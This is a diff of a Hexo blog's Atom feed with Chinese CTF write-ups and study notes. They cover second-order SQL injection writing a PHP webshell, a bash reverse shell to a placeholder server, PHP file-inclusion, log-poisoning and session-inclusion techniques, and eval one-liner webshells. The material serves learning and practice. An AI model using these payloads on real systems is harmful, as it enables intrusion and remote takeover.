@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-15T13:15:58.980Z</updated>
+  <updated>2020-11-03T02:46:45.818Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,79 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>博客初建</title>
+    <link href="http://yoursite.com/2020/07/19/%E9%BB%91%E7%99%BD%E7%9B%92/hello-world/"/>
+    <id>http://yoursite.com/2020/07/19/黑白盒/hello-world/</id>
+    <published>2020-07-19T01:55:38.391Z</published>
+    <updated>2020-11-03T02:46:45.818Z</updated>
+    
+    <content type="html"><![CDATA[<p><center>从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。<center></center></center></p><h4 id="博客更新"><a href="#博客更新" class="headerlink" title="博客更新"></a>博客更新</h4><p>生成静态页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>预览博客效果 Localhost:4000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>同步到Github</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;center&gt;从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。&lt;center&gt;&lt;/center&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h4 id=&quot;博客更新&quot;&gt;&lt;a href=&quot;#博客更新&quot; class=&quot;headerlink&quot; title=&quot;博客更新&quot;&gt;&lt;/a&gt;博客更新&lt;
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>黑白盒</title>
+    <link href="http://yoursite.com/2020/07/19/%E9%BB%91%E7%99%BD%E7%9B%92/"/>
+    <id>http://yoursite.com/2020/07/19/黑白盒/</id>
+    <published>2020-07-19T01:55:38.328Z</published>
+    <updated>2018-11-29T01:24:24.324Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p><p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p><p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p><p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p><p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p><p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p><p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p><h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p><h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p><h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p><h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p><p>linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol><p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p><h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p><p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p><p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2020/07/19/黑白盒/1.png" alt=" "><br>cat读取文件就可以拿到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;黑白盒复现-补招新题&quot;&gt;&lt;a href=&quot;#黑白盒复现-补招新题&quot; class=&quot;headerlink&quot; title=&quot;黑白盒复现(补招新题)&quot;&gt;&lt;/a&gt;黑白盒复现(补招新题)&lt;/h1&gt;&lt;p&gt;招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  &lt;/p&gt;
+&lt;p&gt;首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。&lt;/p&gt;
+&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；&lt;/p&gt;
+&lt;p&gt;2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);&lt;/p&gt;
+&lt;p&gt;3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。&lt;/p&gt;
+&lt;p&gt;4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Web复现" scheme="http://yoursite.com/categories/Web%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>同源策略</title>
+    <link href="http://yoursite.com/2020/07/19/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
+    <id>http://yoursite.com/2020/07/19/同源策略/</id>
+    <published>2020-07-19T01:55:38.313Z</published>
+    <updated>2018-11-19T09:56:32.033Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略</p><h2 id="首先是源的概念："><a href="#首先是源的概念：" class="headerlink" title="首先是源的概念："></a>首先是源的概念：</h2><p>•    源（origin）就是协议、域名和端口号。 以下是相对于 <a href="http://www.a.com/test/index.html" target="_blank" rel="noopener">http://www.a.com/test/index.html</a> 的同源检测<br>•    <a href="http://www.a.com/dir/page.html" target="_blank" rel="noopener">http://www.a.com/dir/page.html</a> —-成功<br>•    <a href="http://www.child.a.com/test/index.html" target="_blank" rel="noopener">http://www.child.a.com/test/index.html</a> —-失败，域名不同<br>•    <a href="https://www.a.com/test/index.html" target="_blank" rel="noopener">https://www.a.com/test/index.html</a> —-失败，协议不同<br>所以所谓同源就是协议、域名和端口号均相同。</p><h2 id="什么是同源策略："><a href="#什么是同源策略：" class="headerlink" title="什么是同源策略："></a>什么是同源策略：</h2><a id="more"></a><p>同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。</p><h6 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h6><p>如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。</p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p>浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域</p><h6 id="不受同源策略限制的："><a href="#不受同源策略限制的：" class="headerlink" title="不受同源策略限制的："></a>不受同源策略限制的：</h6><p>1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br> 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。</p><p>第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h1&gt;&lt;p&gt;最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略&lt;/p&gt;
+&lt;h2 id=&quot;首先是源的概念：&quot;&gt;&lt;a href=&quot;#首先是源的概念：&quot; class=&quot;headerlink&quot; title=&quot;首先是源的概念：&quot;&gt;&lt;/a&gt;首先是源的概念：&lt;/h2&gt;&lt;p&gt;•    源（origin）就是协议、域名和端口号。 以下是相对于 &lt;a href=&quot;http://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/test/index.html&lt;/a&gt; 的同源检测&lt;br&gt;•    &lt;a href=&quot;http://www.a.com/dir/page.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/dir/page.html&lt;/a&gt; —-成功&lt;br&gt;•    &lt;a href=&quot;http://www.child.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.child.a.com/test/index.html&lt;/a&gt; —-失败，域名不同&lt;br&gt;•    &lt;a href=&quot;https://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.a.com/test/index.html&lt;/a&gt; —-失败，协议不同&lt;br&gt;所以所谓同源就是协议、域名和端口号均相同。&lt;/p&gt;
+&lt;h2 id=&quot;什么是同源策略：&quot;&gt;&lt;a href=&quot;#什么是同源策略：&quot; class=&quot;headerlink&quot; title=&quot;什么是同源策略：&quot;&gt;&lt;/a&gt;什么是同源策略：&lt;/h2&gt;
+    
+    </summary>
+    
+      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
+    
+    
+      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
+    
+  </entry>
   
   <entry>
     <title>文件解析漏洞</title>
@@ -408,78 +481,6 @@ output:
     
     
       <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Bugku</title>
-    <link href="http://yoursite.com/2018/12/21/Bugku/"/>
-    <id>http://yoursite.com/2018/12/21/Bugku/</id>
-    <published>2018-12-21T15:29:27.000Z</published>
-    <updated>2019-02-02T07:35:18.408Z</updated>
-    
-    <content type="html"><![CDATA[<p>Bugku补题</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>题目不难涉及到的php函数比较多，都是现查的，记一下<br>开始备份提示，查看临时文件index.php~或者index.php.bak<br>index.php.bak中有源码<br><a id="more"></a><br><img src="/2018/12/21/Bugku/1.png" alt=" "></p><h5 id="strstr-str1-str2"><a href="#strstr-str1-str2" class="headerlink" title="strstr(str1,str2)"></a>strstr(str1,str2)</h5><p> 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。<br>&lt;?php echo strstr(“Helloworld!”,”world”);?&gt;<br>输出：<br>world!</p><h5 id="SERVER-‘REQUEST-URI’"><a href="#SERVER-‘REQUEST-URI’" class="headerlink" title="$_SERVER[‘REQUEST_URI’]"></a>$_SERVER[‘REQUEST_URI’]</h5><p><a href="http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333" target="_blank" rel="noopener">http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333</a><br>结果：<br>$_SERVER[‘QUERY_STRING’]=”p=222&amp;q=333”;<br>$_SERVER[‘REQUEST_URI’]=”/aaa/index.php?p=222&amp;q=333”;<br>$_SERVER[‘SCRIPT_NAME’]=”/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’]=”/aaa/index.php”;</p><p>由实例可知：<br>$_SERVER[“QUERY_STRING”]  获取查询 语句，实例中可知，获取的是?后面的值<br>$_SERVER[“REQUEST_URI”]   获取 <a href="http://localhost" target="_blank" rel="noopener">http://localhost</a> 后面的值，包括/<br>$_SERVER[“SCRIPT_NAME”]   获取当前脚本的路径，如：index.php<br>$  _SERVER[“PHP_SELF”]      当前正在执行脚本的文件名</p><h5 id="substr-string-start-length"><a href="#substr-string-start-length" class="headerlink" title="substr(string,start,length)"></a>substr(string,start,length)</h5><p>substr() 函数返回字符串的一部分。length不必需。<br>echo substr(“Hello world”,6);输出第六个字符之后的<br>输出：world</p><h5 id="str-replace-find-replace-string-count"><a href="#str-replace-find-replace-string-count" class="headerlink" title="str_replace(find,replace,string,count)"></a>str_replace(find,replace,string,count)</h5><p>find<br>必需。规定要查找的值。<br>replace<br>必需。规定替换 find 中的值的值。<br>string<br>必需。规定被搜索的字符串。<br>count<br>可选。一个变量，对替换数进行计数。    </p><p>echo str_replace(“world”,”John”,”Hello world!”);<br>  将world替换为John<br>输出：Hello John!<br>该函数对大小写敏感。请使用 str_ireplace() 执行对大小写不敏感的搜索。  </p><h4 id="parse-str-函数把查询字符串解析到变量中。"><a href="#parse-str-函数把查询字符串解析到变量中。" class="headerlink" title="parse_str() 函数把查询字符串解析到变量中。"></a>parse_str() 函数把查询字符串解析到变量中。</h4><p>parse_str(“name=Peter&amp;age=43”);<br>echo $name;<br>echo $age;<br>输出：Peter 43  </p><h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><p>题目代码的意思就是ip地址之后从？开始的值，然后变为第一位之后的值，删掉?。由echo语句可知变量中有key1和key2，但是$str中遇到key就替换为空，由于替换只执行一次，所以双写就可以绕过，之后MD5碰撞构造payload：<a href="http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。</a><br>当 md5接受的数据为数组时就会返回null，两值相等。</p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h4><p>strcmp(str1,str2)如果str1小于str2返回-1，str1=str2返回0，str1&gt;str2返回1，if(！strcmp($a,$b)),要求a与b中值相等。<br>strcmp()在比较字符串和数组的时候直接返回0<br>a[]=1&amp;b[]=1</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><h3 id="文件包含漏洞-基础知识选自https-blog-csdn-net-qq-41007744-article"><a href="#文件包含漏洞-基础知识选自https-blog-csdn-net-qq-41007744-article" class="headerlink" title="文件包含漏洞(基础知识选自https://blog.csdn.net/qq_41007744/article/)"></a>文件包含漏洞(基础知识选自<a href="https://blog.csdn.net/qq_41007744/article/" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/</a>)</h3><h3 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h3><p>php中提供四个文件包含的函数，分别是include(),include_once(),require()和require_once()。  这四个都可以进行文件包含，但有区别</p><p>require找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本<br>include找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行<br>include_once:此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含<br>require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含</p><h4 id="1-使用PHP封装协议"><a href="#1-使用PHP封装协议" class="headerlink" title="1.使用PHP封装协议"></a>1.使用PHP封装协议</h4><h5 id="file-get-contents内部可以使用php伪协议"><a href="#file-get-contents内部可以使用php伪协议" class="headerlink" title="file_get_contents内部可以使用php伪协议"></a>file_get_contents内部可以使用php伪协议</h5><p>PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似。</p><p>file://              访问本地文件系统<br>http://              访问HTTP(s)网址<br>php://               访问输入/输出流<br>zlib://              压缩流<br>data://              数据<br>ssh2://              Secure Shell 2<br>expect://            处理交互式的流  </p><p>glob://              查找匹配的文件路径  </p><p>使用封装协议读取PHP文件</p><p>使用PHP封装协议内置封装协议可以读取PHP文件。</p><p>(1)<a href="http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php</a></p><p>得到base64加密的php源码</p><p>(2)写入php文件</p><p>使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include(on)。</p><p>构造URL: </p><p><a href="http://www.xxser.com/index.php?page=php://input" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=php://input</a>,</p><p>并且提交数据为: &lt;?php system (‘net user’);?&gt;</p><p>如果提交&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[‘xxser’]);?&gt;”)?&gt;将会在index.php所在目录下生成shell.php</p><h4 id="2-包含截断"><a href="#2-包含截断" class="headerlink" title="2.包含截断"></a>2.包含截断</h4><p>当文件名会被强制添加时使用%00截断，php中不会显示%00后面的内容，这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义。</p><h4 id="3-远程包含Shell"><a href="#3-远程包含Shell" class="headerlink" title="3. 远程包含Shell"></a>3. 远程包含Shell</h4><p>如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: <a href="http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.2cto.com/echo.txt</a></p><p>代码如下:</p><p>&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval ($_POST[x]);?&gt;”)?&gt;<br>访问:</p><p> <a href="http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt</a>,</p><p>将会在Index.php所在的目录下生成shell.php</p><h4 id="4-本地包含配合文件上传"><a href="#4-本地包含配合文件上传" class="headerlink" title="4.本地包含配合文件上传"></a>4.本地包含配合文件上传</h4><p>很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为:</p><p>/uploadfile/201363.jpg</p><p>图片代码如下:</p><p>&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[x]);?&gt;”)?&gt;<br>访问URL: </p><p><a href="http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg" target="_blank" rel="noopener">http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg</a>,</p><p>包含这张图片，将会在Index.php所在的目录中生成shell.php</p><h5 id="5-包含日志文件"><a href="#5-包含日志文件" class="headerlink" title="5.包含日志文件"></a>5.包含日志文件</h5><p>Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中</p><p>当访问一个不存在的资源时，Apache日志同样会记录</p><p>这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: <a href="http://www.xxser.com/" target="_blank" rel="noopener">http://www.xxser.com/</a>&lt;?php phpinfo();?&gt;.Apache会记录请求”&lt;?php phpinfo();?&gt;”</p><p>并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞。</p><p>但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了</p><p>127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] “GET /%3C?php%20phpinfo();)?%3E HTTP/1.1” 403 291</p><p>PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞。</p><p>但可以通过Burp绕过编码</p><p>再利用accsee去包含accsee.log，即可成功执行其中的PHP代码</p><p>在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含<br><img src="/2018/12/21/Bugku/2.png" alt=" "><br>常见几个路径：<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log</p><p>原文链接：<a href="https://blog.csdn.net/qq_41007744/article/" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/</a></p><h4 id="6-包含session文件"><a href="#6-包含session文件" class="headerlink" title="6.包含session文件"></a>6.包含session文件</h4><p>session中的内容可以被控制，传入恶意代码。<br>session的存储位置可以获取。<br>1.通过phpinfo的信息可以获取到session的存储位置。<br><img src="/2018/12/21/Bugku/3.png" alt=" "><br>2.通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存</p><h4 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h4><p>查看php的shell信息：&lt;?php phpinfo();exit;?&gt;<br>eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;<br>&lt;?php @eval($_POST[‘c’]);?&gt;  </p><h3 id="NCTF-Web题‘基本操作’复现"><a href="#NCTF-Web题‘基本操作’复现" class="headerlink" title="NCTF Web题‘基本操作’复现"></a>NCTF Web题‘基本操作’复现</h3><p>登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;”  留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Bugku补题&lt;/p&gt;
-&lt;h2 id=&quot;备份是个好习惯&quot;&gt;&lt;a href=&quot;#备份是个好习惯&quot; class=&quot;headerlink&quot; title=&quot;备份是个好习惯&quot;&gt;&lt;/a&gt;备份是个好习惯&lt;/h2&gt;&lt;p&gt;题目不难涉及到的php函数比较多，都是现查的，记一下&lt;br&gt;开始备份提示，查看临时文件index.php~或者index.php.bak&lt;br&gt;index.php.bak中有源码&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
-    
-    
-      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>xss跨站脚本攻击</title>
-    <link href="http://yoursite.com/2018/12/01/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-1/"/>
-    <id>http://yoursite.com/2018/12/01/xss跨站脚本攻击-1/</id>
-    <published>2018-12-01T00:30:46.000Z</published>
-    <updated>2019-08-02T02:45:06.717Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><p>用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码<br><img src="/2018/12/01/xss跨站脚本攻击-1/捕获.PNG" alt=" "><br><a id="more"></a><br>low难度没有任何过滤直接 <script>alert(‘xss’)</script>就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波，</p><h3 id="str-replace（）："><a href="#str-replace（）：" class="headerlink" title="str_replace（）："></a>str_replace（）：</h3><p>定义和用法</p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。</p><p>该函数必须遵循下列规则：</p><p>如果搜索的字符串是数组，那么它将返回数组。<br>如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。<br>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换<br>如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。<br>注释：该函数区分大小写。请使用 